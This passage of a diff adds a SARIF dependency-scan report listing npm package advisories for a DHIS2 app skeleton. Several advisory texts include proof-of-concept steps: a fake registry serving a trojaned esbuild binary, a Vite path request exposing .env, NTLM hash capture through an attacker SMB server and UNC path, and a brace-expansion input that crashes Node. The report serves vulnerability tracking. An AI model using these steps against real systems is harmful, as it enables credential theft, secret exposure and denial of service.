\"https://registry.npmjs.org\"  // line 70: attacker-controlled\nconst url = ${npmRegistry}/${name}/-/${name.replace(\"@esbuild/\", \"\")}-${version}.tgz     // line 71: URL uses attacker base\nconst buffer = await fetch(url).then(r =\u003e r.arrayBuffer())                                  // line 72: download\nconst executable = extractFileFromTarGzip(new Uint8Array(buffer), subpath)                   // line 73: extract\nawait Deno.mkdir(finalDir, { recursive: true, mode: 0o700 })\nawait Deno.writeFile(finalPath, executable, { mode: 0o755 })                                 // line 80: write + chmod\nreturn finalPath                                                                              // line 81: no hash check\n}\n**Missing protection** — The Node.js equivalent at lib/npm/node-install.ts lines 228–234:\ntypescript\nfunction binaryIntegrityCheck(pkg: string, subpath: string, bytes: Uint8Array): void {\nconst hash = crypto.createHash('sha256').update(bytes).digest('hex')\nconst key = ${pkg}/${subpath}\nconst expected = packageJSON['esbuild.binaryHashes'][key]\nif (!expected) throw new Error(Missing hash for \"${key}\")\nif (hash !== expected) throw new Error(...)\n}\nThis function is called in both the installUsingNPM() path (line 131) and the downloadDirectlyFromNPM() path (line 243), but **no equivalent exists in the Deno module**. Searching the entire git history confirms binaryIntegrityCheck, binaryHashes, sha256, and hash have never appeared in lib/deno/mod.ts.\n**Execution flow after download:** The binary returned by installFromNPM() is passed to spawn() at line 291 of the same file:\ntypescript\nconst child = spawn(binPath, { args: [--service=${version}], ... })\n**Attack vector:** The NPM_CONFIG_REGISTRY environment variable is a standard npm configuration variable widely used in enterprise CI/CD pipelines to point to internal artifact repositories (Artifactory, Nexus, Verdaccio, etc.). An attacker who can inject or modify this variable in a build environment (e.g., via CI config injection, shared environment, or compromised registry) can redirect the download to a server they control and serve a trojaned native binary.\n**Prerequisites:** Deno runtime, Node.js (for fake registry)\n**Step 1:** Create a fake npm registry that serves a malicious binary:\njavascript\n// fake-registry.js\nconst http = require('http');\nconst zlib = "
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 733,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/733"
+                    },
+                    "rule": { "id": "yarn4::GHSA-gv7w-rqvm-qjhr", "index": 12 },
+                    "ruleId": "yarn4::GHSA-gv7w-rqvm-qjhr"
+                },
+                {
+                    "correlationGuid": "bafcca38-e14c-45de-8352-3fb053418545",
+                    "level": "note",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-vpq2-c234-7xj6 in once@1.1.2: Versions of the package @tootallnate/once before 3.0.1 are vulnerable to Incorrect Control Flow Scoping in promise resolving when AbortSignal option is used. The Promise remains in...\nseverity: low\naffected_components: once@1.1.2\naffected_component_paths: \naffected_names: once\naffected_versions: 1.1.2\nid: GHSA-vpq2-c234-7xj6\ndescription:\nVersions of the package @tootallnate/once before 3.0.1 are vulnerable to Incorrect Control Flow Scoping in promise resolving when AbortSignal option is used. The Promise remains in a permanently pending state after the signal is aborted, causing any await or .then() usage to hang indefinitely. This can cause a control-flow leak that can lead to stalled requests, blocked workers, or degraded application availability.\nreference_url: https://github.com/advisories"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 251,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/251"
+                    },
+                    "rule": { "id": "yarn4::GHSA-vpq2-c234-7xj6", "index": 21 },
+                    "ruleId": "yarn4::GHSA-vpq2-c234-7xj6"
+                },
+                {
+                    "correlationGuid": "2f879699-b97b-4d45-8f85-3bebe861133c",
+                    "level": "warning",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-p8p7-x288-28g6 in request@2.88.2: The request package through 2.88.2 for Node.js and the @cypress/request package prior to 3.0.0 allow a bypass of SSRF mitigations via an attacker-controller server that does a cros...\nseverity: medium\naffected_components: request@2.88.2\naffected_component_paths: \naffected_names: request\naffected_versions: 2.88.2\nid: GHSA-p8p7-x288-28g6\ndescription:\nThe request package through 2.88.2 for Node.js and the @cypress/request package prior to 3.0.0 allow a bypass of SSRF mitigations via an attacker-controller server that does a cross-protocol redirect (HTTP to HTTPS, or HTTPS to HTTP).\nNOTE: The request package is no longer supported by the maintainer.\nreference_url: https://github.com/advisories"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 734,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/734"
+                    },
+                    "rule": { "id": "yarn4::GHSA-p8p7-x288-28g6", "index": 16 },
+                    "ruleId": "yarn4::GHSA-p8p7-x288-28g6"
+                },
+                {
+                    "correlationGuid": "9844aae1-0e7e-4eba-b5ff-450cec177f8b",
+                    "level": "error",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-w5hq-g745-h8pq in uuid@3.4.0: The v3(), v5(), and v6() API methods (https://github.com/uuidjs/uuid#api-summary) (not uuid release versions) accept external output buffers but do not reject out-of-range writes (...\nseverity: medium\naffected_components: uuid@3.4.0\naffected_component_paths: \naffected_names: uuid\naffected_versions: 3.4.0\nid: GHSA-w5hq-g745-h8pq\ndescription:\nThe v3(), v5(), and v6() API methods (https://github.com/uuidjs/uuid#api-summary) (not uuid release versions) accept external output buffers but do not reject out-of-range writes (small buf or large offset).\nBy contrast, v4(), v1(), and v7() API methods explicitly throw RangeError on invalid bounds.\nThis inconsistency allows **silent partial writes** into caller-provided buffers.\nAffected code\n- src/v35.ts (v3()/v5() path) writes buf[offset + i] without bounds validation.\n- src/v6.ts writes buf[offset + i] without bounds validation.\nReproducible PoC\nbash\ncd /home/StrawHat/uuid\nnpm ci\nnpm run build\nnode --input-type=module -e \"\nimport {v4,v5,v6} from './dist-node/index.js';\nconst ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nfor (const [name,fn] of [\n['v4()',()=\u003ev4({},new Uint8Array(8),4)],\n['v5()',()=\u003ev5('x',ns,new Uint8Array(8),4)],\n['v6()',()=\u003ev6({},new Uint8Array(8),4)],\n]) {\ntry { fn(); console.log(name,'NO_THROW'); }\ncatch(e){ console.log(name,'THREW',e.name); }\n}\"\nObserved:\n- v4() THREW RangeError\n- v5() NO_THROW\n- v6() NO_THROW\nExample partial overwrite evidence captured during audit:\ntext\nsame true buf [\n170, 170, 170, 170,\n75, 224, 100,  63\n]\nv6 [\n187, 187, 187, 187,\n31,  19, 185,  64\n]\nSecurity impact\n- **Primary**: integrity/robustness issue (silent partial output).\n- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.\n- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.\nSuggested fix\nAdd the same guard used by v4()/v1()/v7():\nts\nif (offset \u003c 0 || offset + 16 \u003e buf.length) {\nthrow new RangeError(UUID byte range ${offset}:${offset + 15} is out of buffer bounds);\n}\nApply to:\n- src/v35.ts (covers v3() and v5())\n- src/v6.ts\nreference_url: https://github.com/advisories"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 735,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/735"
+                    },
+                    "rule": { "id": "yarn4::GHSA-w5hq-g745-h8pq", "index": 22 },
+                    "ruleId": "yarn4::GHSA-w5hq-g745-h8pq"
+                },
+                {
+                    "correlationGuid": "abc18575-a48b-4279-ab3f-f52fd82f9e5a",
+                    "level": "warning",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-72xf-g2v4-qvf3 in tough-cookie@2.5.0: Versions of the package tough-cookie before 4.1.3 are vulnerable to Prototype Pollution due to improper handling of Cookies when using CookieJar in rejectPublicSuffixes=false mode....\nseverity: medium\naffected_components: tough-cookie@2.5.0\naffected_component_paths: \naffected_names: tough-cookie\naffected_versions: 2.5.0\nid: GHSA-72xf-g2v4-qvf3\ndescription:\nVersions of the package tough-cookie before 4.1.3 are vulnerable to Prototype Pollution due to improper handling of Cookies when using CookieJar in rejectPublicSuffixes=false mode. This issue arises from the manner in which the objects are initialized.\nreference_url: https://github.com/advisories"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 739,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/739"
+                    },
+                    "rule": { "id": "yarn4::GHSA-72xf-g2v4-qvf3", "index": 4 },
+                    "ruleId": "yarn4::GHSA-72xf-g2v4-qvf3"
+                },
+                {
+                    "correlationGuid": "90d65901-33a8-442b-a522-20d1bdeaed91",
+                    "level": "warning",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-4w7w-66w2-5vf9 in vite@5.4.21: Any files ending with .map even out side the project can be returned to the browser.\nseverity: medium\naffected_components: vite@5.4.21\naffected_component_paths: \naffected_names: vite\naffected_versions: 5.4.21\nid: GHSA-4w7w-66w2-5vf9\ndescription:\nAny files ending with .map even out side the project can be returned to the browser.\nOnly apps that match the following conditions are affected:\n- explicitly exposes the Vite dev server to the network (using --host or server.host config option (https://vitejs.dev/config/server-options.html#server-host))\n- have a sensitive content in files ending with .map and the path is predictable\nIn Vite v7.3.1, the dev server’s handling of .map requests for optimized dependencies resolves file paths and calls readFile without restricting ../ segments in the URL. As a result, it is possible to bypass the server.fs.strict (https://vite.dev/config/server-options#server-fs-strict) allow list and retrieve .map files located outside the project root, provided they can be parsed as valid source map JSON.\n1. Create a minimal PoC sourcemap outside the project root\nbash\ncat \u003e /tmp/poc.map \u003c\u003c'EOF'\n{\"version\":3,\"file\":\"x.js\",\"sources\":[],\"names\":[],\"mappings\":\"\"}\nEOF\n2. Start the Vite dev server (example)\nbash\npnpm -C playground/fs-serve dev --host 127.0.0.1 --port 18080\n3. Confirm that direct /@fs access is blocked by strict (returns 403)\n\u003cimg width=\"4004\" height=\"1038\" alt=\"image\" src=\"https://github.com/user-attachments/assets/15a859a8-1dc6-4105-8d58-80527c0dd9ab\" /\u003e\n4. Inject ../ segments under the optimized deps .map URL prefix to reach /tmp/poc.map\n\u003cimg width=\"2790\" height=\"846\" alt=\"image\" src=\"https://github.com/user-attachments/assets/5d02957d-2e6a-4c45-9819-3f024e0e81f2\" /\u003e\nreference_url: https://github.com/advisories"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 740,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/740"
+                    },
+                    "rule": { "id": "yarn4::GHSA-4w7w-66w2-5vf9", "index": 1 },
+                    "ruleId": "yarn4::GHSA-4w7w-66w2-5vf9"
+                },
+                {
+                    "correlationGuid": "673e5474-bdc0-4a81-b9e7-c6c1d069f173",
+                    "level": "error",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-fx2h-pf6j-xcff in vite@5.4.21: The contents of files that are specified by server.fs.deny (https://vite.dev/config/server-options#server-fs-deny) can be returned to the browser on Windows.\nseverity: high\naffected_components: vite@5.4.21\naffected_component_paths: \naffected_names: vite\naffected_versions: 5.4.21\nid: GHSA-fx2h-pf6j-xcff\ndescription:\nThe contents of files that are specified by server.fs.deny (https://vite.dev/config/server-options#server-fs-deny) can be returned to the browser on Windows.\nOnly apps that match the following conditions are affected:\n- explicitly exposes the Vite dev server to the network (using --host or server.host config option (https://vitejs.dev/config/server-options.html#server-host))\n- the sensitive file exists in the allowed directories specified by server.fs.allow (https://vite.dev/config/server-options#server-fs-allow)\n- either of:\n- the sensitive file exists in an NTFS volume\n- the dev server is running on Windows and the sensitive file exists in a volume that 8.3 short name generation is enabled (it is enabled by default on system volumes)\nVite’s dev server denies direct access to sensitive files through server.fs.deny, including entries such as .env, .env.*, and *.{crt,pem}. However, on Windows, the deny logic does not correctly normalize NTFS ADS path forms before access checks are applied.\nBecause of this, requests such as /.env::$DATA?raw are treated as allowed paths, while Windows resolves them to the original file's default data stream.\nSimilar to that, Windows allows accessing a file using a different name with the 8.3 short name compatibility feature. Vite did not reject accessing files via them.\nbash\n$ npm create vite@latest\n$ cd vite-project/\n$ npm install\n$ npm run dev\nAccess via browser at http://localhost:5173/.env::$DATA?raw\n\u003cimg width=\"388\" height=\"129\" alt=\"deecc1315123883cfd0f9c26a002845a\" src=\"https://github.com/user-attachments/assets/895c6012-4e2e-4a35-babb-69bbf3ee7170\" /\u003e\nExample expected result:\n- /.env::$DATA?raw returns the contents of .env\n- /tls.pem::$DATA?raw returns the contents of tls.pem\nreference_url: https://github.com/advisories"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 741,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/741"
+                    },
+                    "rule": { "id": "yarn4::GHSA-fx2h-pf6j-xcff", "index": 8 },
+                    "ruleId": "yarn4::GHSA-fx2h-pf6j-xcff"
+                },
+                {
+                    "correlationGuid": "a2d064a2-6f2b-45ba-a797-c843587be159",
+                    "level": "warning",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-v6wh-96g9-6wx3 in vite@5.4.21: The launch-editor NPM package accesses arbitrary paths including Windows UNC paths. When a UNC path is opened, Windows automatically attempts NTLM authentication to the remote host...\nseverity: medium\naffected_components: vite@5.4.21\naffected_component_paths: \naffected_names: vite\naffected_versions: 5.4.21\nid: GHSA-v6wh-96g9-6wx3\ndescription:\nThe launch-editor NPM package accesses arbitrary paths including Windows UNC paths. When a UNC path is opened, Windows automatically attempts NTLM authentication to the remote host, causing the user’s NTLMv2 password hash to be leaked to an attacker-controlled SMB server. This can result in credential compromise through offline hash cracking.\nIf the following conditions are met, an attacker can get the NTLMv2 password hash on the computer that is using the launch-editor:\n- using Windows\n- NTLM is not disabled (it is recommended to disable (https://techcommunity.microsoft.com/blog/windows-itpro-blog/advancing-windows-security-disabling-ntlm-by-default/4489526), while it's still enabled by default)\n- the user accesses the attackers website that sends request to a middleware using launch-editor\n- the server that has the middleware using launch-editor is running\n- the attacker knows the URL for that server and the middleware\nThis would be a problem if the user password is too simple that it can be identified through offline hash cracking, potentially leading to further compromise of developer accounts or internal systems.\nlaunch-editor accepts file paths without validating or restricting Windows UNC paths such as:\n\\\\attacker-host\\share\nOn Windows systems, accessing a UNC path triggers an automatic NTLM authentication attempt to the remote SMB server. No user interaction or warning is required for this authentication attempt to occur.\nIf an attacker controls the SMB server referenced by the UNC path the victim’s NTLMv2 hash is transmitted to the attacker. The attacker can then capture the hash and perform offline password cracking. Successful cracking reveals the victim’s cleartext password.\nThe attacker could target a developer that uses a development server using launch-editor to develop code locally, send them a link and grab their NTLMv2 hash.\nFrom the attacker side, we will setup an SMB server. I personally used Impacket's smbserver.py (https://github.com/fortra/impacket/blob/master/examples/smbserver.py), but you could use something like Responder (https://github.com/lgandx/Responder) for this as well. For keeping it simple, we will use smbserver.py here.\nFirst, let's create a directory to serve as an SMB share.\nmkdir /tmp/data\necho \"Hello world\" \u003e /tmp/data/test.txt\nThen, start the SMB server.\n$ sudo smbserver.py -smb2support -debug share /tmp/data\nNow, run any project that uses the launch-editor package. I have setup a simple \"Hello world\" project that uses Vite to do this. Then run the project locally (vite).\nNow last, we will open a browser window and navigate to the URL used by the launch-editor package to trigger the NTLM authentication. Or we can use curl to achieve the same.\ncurl 'http://localhost:5173/__open-in-editor?file=%5c%5c127.0.0.1%5cshare%5ctest.txt'\nNote the IP address in the HTTP request, and make sure it connects to the IP address of the SMB server. Now we can look at the logs of smbserver.py and see the NTLMv2 hash coming in.\n\u003cimg width=\"1916\" height=\"277\" alt=\"2026-01-30_10-58\" src=\"https://github.com/user-attachments/assets/2f606e8f-c9bb-41dc-b507-ea6606b53368\" /\u003e\nreference_url: https://github.com/advisories"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 742,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/742"
+                    },
+                    "rule": { "id": "yarn4::GHSA-v6wh-96g9-6wx3", "index": 20 },
+                    "ruleId": "yarn4::GHSA-v6wh-96g9-6wx3"
+                },
+                {
+                    "correlationGuid": "33604b3b-8b7c-4d47-a56a-ee7cc4db6730",
+                    "level": "warning",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-pfrx-2q88-qq97 in got@9.6.0: The got package before 11.8.5 and 12.1.0 for Node.js allows a redirect to a UNIX socket.\nseverity: medium\naffected_components: got@9.6.0\naffected_component_paths: \naffected_names: got\naffected_versions: 9.6.0\nid: GHSA-pfrx-2q88-qq97\ndescription:\nThe got package before 11.8.5 and 12.1.0 for Node.js allows a redirect to a UNIX socket.\nreference_url: https://github.com/advisories"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 743,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/743"
+                    },
+                    "rule": { "id": "yarn4::GHSA-pfrx-2q88-qq97", "index": 17 },
+                    "ruleId": "yarn4::GHSA-pfrx-2q88-qq97"
+                },
+                {
+                    "correlationGuid": "8d42cb9f-a239-4f60-99c6-890bbf2802d4",
+                    "level": "error",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-mh99-v99m-4gvg in brace-expansion@1.1.18: expand() bounds the *number* of results it produces (the max option,\nseverity: high\naffected_components: brace-expansion@1.1.18\naffected_component_paths: \naffected_names: brace-expansion\naffected_versions: 1.1.18\nid: GHSA-mh99-v99m-4gvg\ndescription:\nexpand() bounds the *number* of results it produces (the max option,\n100_000 by default) but not their *length*. By chaining many brace groups,\nan attacker keeps the result count under max while making every result grow\nwith the number of groups. Building max long results — plus the intermediate\narrays combined at each brace group — exhausts memory and crashes the Node\nprocess with an **uncatchable** out-of-memory error. try/catch around\nexpand() does not help: the fatal error terminates the process.\nA ~7.5 KB input ('{a,b}'.repeat(1500)) is enough to crash a default Node\nprocess.\nFor N chained brace groups such as '{a,b}'.repeat(N):\n- the result count is 2^N, immediately capped at max (100_000), so the\nmax protection appears to hold, but\n- each result is N characters long, so the total output size is\nmax × N characters, which grows without bound in N.\nexpand_ combines each brace set with the fully-expanded tail:\njs\nconst post = m.post.length ? expand_(m.post, max, false) : ['']\n...\nfor (let j = 0; j \u003c N.length; j++) {\nfor (let k = 0; k \u003c post.length \u0026\u0026 expansions.length \u003c max; k++) {\nconst expansion = pre + N[j] + post[k]   // grows one group longer per level\n...\nexpansions.push(expansion)\n}\n}\nThe loop guard expansions.length \u003c max limits how many strings are built, but\nnothing limits how long they get. Each recursion level materializes another\narray of up to max strings, one character longer than the level below, and —\nbecause V8 represents pre + N[j] + post[k] as a cons-string (rope) that\nreferences post[k] — those intermediate strings stay reachable through the\nwhole chain. Memory therefore scales with max × N.\nMeasured on 5.0.7 ('{a,b}'.repeat(N), default max):\n| groups (N) | input bytes | result count | peak RSS |\n|---|---|---|---|\n| 20 | 100 | 100,000 | ~80 MB |\n| 50 | 250 | 100,000 | ~214 MB |\n| 100 | 500 | 100,000 | ~409 MB |\n| 300 | 1,500 | 100,000 | ~1,148 MB |\n| 1500 | 7,500 | — | **OOM crash** |\nProof of concept\njs\nconst { expand } = require('brace-expansion')\n// ~7.5 KB input — crashes the process with a fatal, uncatchable OOM:\n//   FATAL ERROR: ... JavaScript heap out of memory\ntry {\nexpand('{a,b}'.repeat(1500))\n} catch (e) {\n// never reached — the process is already dead\n}\nAny application that passes attacker-influenced strings to\nbrace-expansion.expand() — directly, or transitively via minimatch / glob\nbrace patterns — can be crashed by a small request. Because the failure is a\nfatal V8 out-of-memory error rather than a thrown exception, it cannot be caught\nand it takes down the whole worker/process, denying service.\nRemediation\nUpgrade to a patched release. The fix bounds the total number of characters a\nsingle expand() call may accumulate (EXPANSION_MAX_LENGTH, default\n4_000_000, configurable via a new maxLength option), applied inside the\noutput-building loops so intermediate arrays are bounded too. Once the limit is\nreached, output is truncated — consistent with how max already truncates —\ninstead of growing without bound. The limit sits well above any realistic\nexpansion (100,000 results hitting max measure ~1M characters), so legitimate\ninput is unaffected.\nAfter the fix, '{a,b}'.repeat(1500) returns a bounded, truncated result in\n~0.7 s using ~340 MB and never crashes, including under a constrained 512 MB\nheap.\nThe fix bounds memory but the algorithm still rebuilds intermediate arrays at\neach level (roughly O(N × maxLength) work on this input class). A streaming\nrewrite that produces output in O(total output size) can be a non-urgent\nfollow-up.\nIf immediate upgrade isn't possible, avoid passing untrusted input to\nexpand() / glob brace patterns, or pass a small explicit max **and**\nmaxLength.\nreference_url: https://github.com/advisories"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 706,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/706"
+                    },
+                    "rule": { "id": "yarn4::GHSA-mh99-v99m-4gvg", "index": 14 },
+                    "ruleId": "yarn4::GHSA-mh99-v99m-4gvg"
+                },
+                {
+                    "correlationGuid": "0c2fdabd-33bf-4c16-8d18-6108569d4797",
+                    "level": "error",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-mh99-v99m-4gvg in brace-expansion@2.1.4: expand() bounds the *number* of results it produces (the max option,\nseverity: high\naffected_components: brace-expansion@2.1.4\naffected_component_paths: \naffected_names: brace-expansion\naffected_versions: 2.1.4\nid: GHSA-mh99-v99m-4gvg\ndescription:\nexpand() bounds the *number* of results it produces (the max option,\n100_000 by default) but not their *length*. By chaining many brace groups,\nan attacker keeps the result count under max while making every result grow\nwith the number of groups. Building max long results — plus the intermediate\narrays combined at each brace group — exhausts memory and crashes the Node\nprocess with an **uncatchable** out-of-memory error. try/catch around\nexpand() does not help: the fatal error terminates the process.\nA ~7.5 KB input ('{a,b}'.repeat(1500)) is enough to crash a default Node\nprocess.\nFor N chained brace groups such as '{a,b}'.repeat(N):\n- the result count is 2^N, immediately capped at max (100_000), so the\nmax protection appears to hold, but\n- each result is N characters long, so the total output size is\nmax × N characters, which grows without bound in N.\nexpand_ combines each brace set with the fully-expanded tail:\njs\nconst post = m.post.length ? expand_(m.post, max, false) : ['']\n...\nfor (let j = 0; j \u003c N.length; j++) {\nfor (let k = 0; k \u003c post.length \u0026\u0026 expansions.length \u003c max; k++) {\nconst expansion = pre + N[j] + post[k]   // grows one group longer per level\n...\nexpansions.push(expansion)\n}\n}\nThe loop guard expansions.length \u003c max limits how many strings are built, but\nnothing limits how long they get. Each recursion level materializes another\narray of up to max strings, one character longer than the level below, and —\nbecause V8 represents pre + N[j] + post[k] as a cons-string (rope) that\nreferences post[k] — those intermediate strings stay reachable through the\nwhole chain. Memory therefore scales with max × N.\nMeasured on 5.0.7 ('{a,b}'.repeat(N), default max):\n| groups (N) | input bytes | result count | peak RSS |\n|---|---|---|---|\n| 20 | 100 | 100,000 | ~80 MB |\n| 50 | 250 | 100,000 | ~214 MB |\n| 100 | 500 | 100,000 | ~409 MB |\n| 300 | 1,500 | 100,000 | ~1,148 MB |\n| 1500 | 7,500 | — | **OOM crash** |\nProof of concept\njs\nconst { expand } = require('brace-expansion')\n// ~7.5 KB input — crashes the process with a fatal, uncatchable OOM:\n//   FATAL ERROR: ... JavaScript heap out of memory\ntry {\nexpand('{a,b}'.repeat(1500))\n} catch (e) {\n// never reached — the process is already dead\n}\nAny application that passes attacker-influenced strings to\nbrace-expansion.expand() — directly, or transitively via minimatch / glob\nbrace patterns — can be crashed by a small request. Because the failure is a\nfatal V8 out-of-memory error rather than a thrown exception, it cannot be caught\nand it takes down the whole worker/process, denying service.\nRemediation\nUpgrade to a patched release. The fix bounds the total number of characters a\nsingle expand() call may accumulate (EXPANSION_MAX_LENGTH, default\n4_000_000, configurable via a new maxLength option), applied inside the\noutput-building loops so intermediate arrays are bounded too. Once the limit is\nreached, output is truncated — consistent with how max already truncates —\ninstead of growing without bound. The limit sits well above any realistic\nexpansion (100,000 results hitting max measure ~1M characters), so legitimate\ninput is unaffected.\nAfter the fix, '{a,b}'.repeat(1500) returns a bounded, truncated result in\n~0.7 s using ~340 MB and never crashes, including under a constrained 512 MB\nheap.\nThe fix bounds memory but the algorithm still rebuilds intermediate arrays at\neach level (roughly O(N × maxLength) work on this input class). A streaming\nrewrite that produces output in O(total output size) can be a non-urgent\nfollow-up.\nIf immediate upgrade isn't possible, avoid passing untrusted input to\nexpand() / glob brace patterns, or pass a small explicit max **and**\nmaxLength.\nreference_url: https://github.com/advisories"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 711,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/711"
+                    },
+                    "rule": { "id": "yarn4::GHSA-mh99-v99m-4gvg", "index": 14 },
+                    "ruleId": "yarn4::GHSA-mh99-v99m-4gvg"
+                }
+            ],
+            "tool": {
+                "driver": {
+                    "fullName": "OWASP Dependency-Track - 4.13.6",
+                    "name": "OWASP Dependency-Track (yarn4)",
+                    "rules": [
+                        {
+                            "defaultConfiguration": { "level": "warning" },
+                            "fullDescription": {
+                                "text": "[yarn4] GHSA-22p9-wv53-3rq4\n\nLinkifyIt.prototype.match — the package's primary public API — has **O(N²) algorithmic complexity** for inputs containing many fuzzy links or emails. This is not a regex backtrack ...\n\nReference: https://github.com/advisories"
+                            },
+                            "helpUri": "https://github.com/advisories",
+                            "id": "yarn4::GHSA-22p9-wv53-3rq4",
+                            "name": "InefficientRegularExpressionComplexity",
+                            "properties": {
+                                "precision": "high",
+                                "security-severity": "8",
+                                "tags": ["security"]
+                            },
+                            "shortDescription": { "text": "[yarn4] GHSA-22p9-wv53-3rq4" }
+                        },
+                        {
+                            "defaultConfiguration": { "level": "warning" },
+                            "fullDescription": {
+                                "text": "[yarn4] GHSA-4w7w-66w2-5vf9\n\nAny files ending with .map even out side the project can be returned to the browser.\n\nReference: https://github.com/advisories"
+                            },
+                            "helpUri": "https://github.com/advisories",
+                            "id": "yarn4::GHSA-4w7w-66w2-5vf9",
+                            "name": "ImproperLimitationOfAPathnameToARestrictedDirectory('pathTraversal')",
+                            "properties": {
+                                "precision": "high",
+                                "security-severity": "5",
+                                "tags": ["security"]
+                            },
+                            "shortDescription": { "text": "[yarn4] GHSA-4w7w-66w2-5vf9" }
+                        },
+                        {
+                            "defaultConfiguration": { "level": "warning" },
+                            "fullDescription": {
+                                "text": "[yarn4] GHSA-5xrq-8626-4rwp\n\nArbitrary file can be read on Windows when Vitest UI server is listening, especially when exposed to the network.\n\nReference: https://github.com/advisories"
+                            },
+                            "helpUri": "https://github.com/advisories",
+                            "id": "yarn4::GHSA-5xrq-8626-4rwp",
+                            "name": "MissingAuthorization",
+                            "properties": {
+                                "precision": "high",
+                                "security-severity": "9.8",
+                                "tags": ["security"]
+                            },
+                            "shortDescription": { "text": "[yarn4] GHSA-5xrq-8626-4rwp" }
+                        },
+                        {
+                            "defaultConfiguration": { "level": "warning" },
+                            "fullDescription": {
+                                "text": "[yarn4] GHSA-67mh-4wv8-2f99\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\nReference: https://github.com/advisories"
+                            },
+                            "helpUri": "https://github.com/advisories",
+                            "id": "yarn4::GHSA-67mh-4wv8-2f99",
+                            "name": "OriginValidationError",
+                            "properties": {
+                                "precision": "high",
+                                "security-severity": "5.3",
+                                "tags": ["security"]
+                            },
+                            "shortDescription": { "text": "[yarn4] GHSA-67mh-4wv8-2f99" }
+                        },
+                        {
